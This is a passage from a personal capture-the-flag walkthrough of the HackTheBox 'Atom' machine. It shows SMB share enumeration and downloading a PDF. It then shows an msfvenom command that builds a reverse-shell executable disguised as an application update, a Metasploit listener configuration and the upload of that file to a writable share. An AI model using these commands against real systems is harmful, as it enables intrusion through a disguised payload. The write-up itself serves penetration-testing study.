# SMB
I tried manually connecting to SMB:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/results/10.10.10.237/scans]
└─$ smbclient -L 10.10.10.237 \\\\atom\\shares
Enter WORKGROUP\mac's password: 
┌──(mac㉿kali)-[~/Documents/HTB/atom/results/10.10.10.237/scans]
└─$ smbclient -L 10.10.10.237 -U null -p "" \\\\atom\\shares
Enter WORKGROUP\null's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Software_Updates Disk      
SMB1 disabled -- no workgroup available
```

Autorecon and nmap did a lot of scans, but I wanted to replicate the results so I understood how to read them. This is duplicated work, but I'd never used the service before.

I used `smbmap` to review which shares are readable.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbmap -H 10.10.10.237
[!] Authentication error on 10.10.10.237
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbmap -H 10.10.10.237 -u null -p ""
[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Software_Updates                                  	READ, WRITE
```

So I can read the `IPC$` share. Let's try to connect to it:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbclient //10.10.10.237/IPC$
Enter WORKGROUP\mac's password: 
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_INVALID_INFO_CLASS listing \*
```

### Mounting the Share

I didn't know what this error was, so I tried to [[smbclient#Mount a Share|mount the share]] instead.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ sudo mkdir /mnt/atom
[sudo] password for mac: 
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ sudo mkdir /mnt/atom/IPC
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ sudo mount -t cifs //10.10.10.237/IPC$ /mnt/atom/IPC/
Password for root@//10.10.10.237/IPC$: 
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ ls /mnt/atom/IPC/
ls: reading directory '/mnt/atom/IPC/': Input/output error
```

Weird. A quick google of "ls input output error" suggests this is a '[hardware issue](https://unix.stackexchange.com/questions/39905/input-output-error-when-accessing-a-directory)'. `ls` works on the rest of my filesystem, so I suspect it's an incompatibility between Linux and Windows filesystems.

I tried the `dmesg` command as suggested in the thread linked above:

```bash
┌──(mac㉿kali)-[~]
└─$ sudo dmesg
...[SNIP]...
[ 2405.593147] FS-Cache: Loaded
[ 2405.601885] Key type dns_resolver registered
[ 2405.799728] FS-Cache: Netfs 'cifs' registered for caching
[ 2405.813289] Key type cifs.spnego registered
[ 2405.813291] Key type cifs.idmap registered
[ 2405.813579] CIFS: Attempting to mount //10.10.10.237/IPC$
[ 2405.813593] CIFS: No dialect specified on mount. Default has changed to a more secure dialect, SMB2.1 or later (e.g. SMB3.1.1), from CIFS (SMB1). To use the less secure SMB1 dialect to access old servers which do not support SMB3.1.1 (or even SMB3 or SMB2.1) specify vers=1.0 on mount.
```

I guess I was correct. It seems that I need to [specify the dialect](https://askubuntu.com/questions/1098369/mount-cifs-problems-on-ubuntu-18-04). I will unmount and remount using this new command.

```bash
┌──(mac㉿kali)-[~]
└─$ sudo umount /mnt/atom/IPC
```

The results of the nmap scan on port 445 show that the Samba server supports dialects `2.02` and above:

```
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|     3.02
|_    3.11
```

So let's remount using one of these. `dmesg` suggested version 2.10:

```bash
┌──(mac㉿kali)-[~]
└─$ sudo mount -t cifs -o vers=2.1 //10.10.10.237/IPC$ /mnt/atom/IPC/
Password for root@//10.10.10.237/IPC$: 
┌──(mac㉿kali)-[~]
└─$ ls /mnt/atom/IPC/
ls: reading directory '/mnt/atom/IPC/': Input/output error
```

I re-read the `dmesg` and realised it suggested using SMB1 in conjunction with `cifs`. So I unmounted and tried again:

```bash
┌──(mac㉿kali)-[/mnt/atom]
└─$ sudo umount /mnt/atom/IPC
┌──(mac㉿kali)-[/mnt/atom]
└─$ sudo mount -t cifs -o vers=1.0 //10.10.10.237/IPC$ /mnt/atom/IPC/
Password for root@//10.10.10.237/IPC$: 
mount error(13): Permission denied
Refer to the mount.cifs(8) manual page (e.g. man mount.cifs) and kernel log messages (dmesg)

...[READING DMESG]...

[ 3053.910376] CIFS: Attempting to mount //10.10.10.237/IPC$
[ 3150.701746] CIFS: Attempting to mount //10.10.10.237/IPC$
[ 3150.701760] CIFS: VFS: Use of the less secure dialect vers=1.0 is not recommended unless required for access to very old servers
[ 3150.926735] CIFS: VFS: cifs_mount failed w/return code = -13
```

So it looks like it's not going to be easy to mount this drive. Rather than trying to fix this error, I'll just go back to `smbclient` and fix that error.

### Using smbclient

[This page](http://www.stbsuite.com/support/virtual-training-center/nt-status-errors) provides a little info on the `NT_STATUS_INVALID_INFO_CLASS` error. It seems to be an incorrect parameter.

There were a few writeups online that mentioned the error, but I couldn't find a solution in any of them. [This writeup](https://blog.yekki.co.uk/querier/) suggests just moving onto the next share - so that's what I did.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbclient //10.10.10.237/Software_Updates
Enter WORKGROUP\mac's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 20 16:52:03 2021
  ..                                  D        0  Tue Apr 20 16:52:03 2021
  client1                             D        0  Tue Apr 20 16:52:03 2021
  client2                             D        0  Tue Apr 20 16:52:03 2021
  client3                             D        0  Tue Apr 20 16:52:03 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 12:18:08 2021

		4413951 blocks of size 4096. 1349120 blocks available
smb: \> 
```

That's better. Hopefully the other share had nothing in it.

Exploring this share, there is nothing in any of the `client` directories.

Let's get that pdf we saw in the nmap scan:

```bash
smb: \> get UAT_Testing_Procedures.pdf 
getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (243.8 KiloBytes/sec) (average 243.8 KiloBytes/sec)
smb: \> exit
```

It has some interesting information:

![[Pasted image 20210420170103.png]]

It suggests that the current application does not interact with a server at all, but that there is a server active. Perhaps there is an API on the domain that we can interact with.

It also suggests uploading an `exe` file to one of the `client` directories on Samba will cause the `QA team` to run it. So if we can create a malicious `exe` we might be able to get a shell.

### Generating a Payload

Let's use msfvenom to [make a malicious exe](https://www.offensive-security.com/metasploit-unleashed/binary-payloads/).

The nmap scan tells us it's 64-bit windows. I tried the same command as in the OffSec article but replaced the exe name with one that looked like an updated version of Heed.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.14.167 LPORT=9001 -b "\x00" -e x86/shikata_ga_nai -f exe -o "heedv1 Setup 1.0.1.exe"
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: heedv1 Setup 1.0.1.exe
```

I then setup a listener using the `handler` module so I could be sure its settings matched the shellcode:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom/heed_source]
└─$ msfconsole -q
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LPORT 9001
LPORT => 9001
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => 10.10.14.167
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.167:9001
```

I then logged into the SMB server again and `put` my file:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/atom]
└─$ smbclient //10.10.10.237/Software_Updates
Enter WORKGROUP\mac's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Apr 21 21:00:02 2021
  ..                                  D        0  Wed Apr 21 21:00:02 2021
  client1                             D        0  Wed Apr 21 21:00:02 2021
  client2                             D        0  Wed Apr 21 21:00:02 2021
  client3                             D        0  Wed Apr 21 21:00:02 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 12:18:08 2021

		4413951 blocks of size 4096. 1343700 blocks available
smb: \> cd client1
smb: \client1\> dir
  .                                   D        0  Wed Apr 21 21:00:43 2021
  ..                                  D        0  Wed Apr 21 21:00:43 2021

		4413951 blocks of size 4096. 1343670 blocks available
smb: \client1\> put "heedv1 Setup 1.0.1.exe"
putting file heedv1 Setup 1.0.1.exe as \client1\heedv1 Setup 1.0.1.exe (294.2 kb/s) (average 294.2 kb/s)
```

After a short wait, I didn't get a hit on my handler. So I figured this was not the appropriate trigger mechanism.

I spent a bit of time here trying to analyse the `.exe` in Ghidra. This didn't turn out to be necessary, and I eventually gave up on it - but [0xdf](https://0xdf.gitlab.io/2021/07/10/htb-atom.html#heed-re) did some good reversing which would have made the upcoming CVE easier to find.